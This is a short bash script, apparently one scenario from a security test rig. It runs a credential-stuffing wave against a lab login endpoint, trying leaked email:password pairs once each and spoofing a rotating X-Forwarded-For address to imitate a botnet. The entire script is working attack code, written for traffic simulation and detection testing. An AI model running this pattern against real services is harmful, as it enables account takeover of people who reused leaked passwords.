#!/usr/bin/env bash
# MIN-02 variant a: one wave of credential stuffing. A leaked email:password list (lib/customers.py
# combos: the customers who reused a leaked password, stale pairs and strangers) tried once each
# against the login, each from a different address of a botnet (X-Forwarded-For, trusted from the
# tools box only: D-27), python-requests user agent. Responses are captured (D-25): a success hands
# back the customer's address, and that soul is gone. Runs inside the rig's tools container only.
# tool: curl 8.x
# label: wave: ~90 leaked pairs, one per botnet address, python-requests user agent
set -eu
. /attacks/lib/capture.sh
i=0
python3 /attacks/lib/customers.py combos | while IFS= read -r pair; do
  email=${pair%%:*} password=${pair#*:}
  ip="203.0.113.$(( 128 + (i * 37) % 123 ))"
  i=$((i + 1))
  req -X POST http://10.66.0.10/rest/user/login -H 'Content-Type: application/json' -H "X-Forwarded-For: $ip" \
    -A 'python-requests/2.32.3' --data-raw "{\"email\":\"$email\",\"password\":\"$password\"}"
done
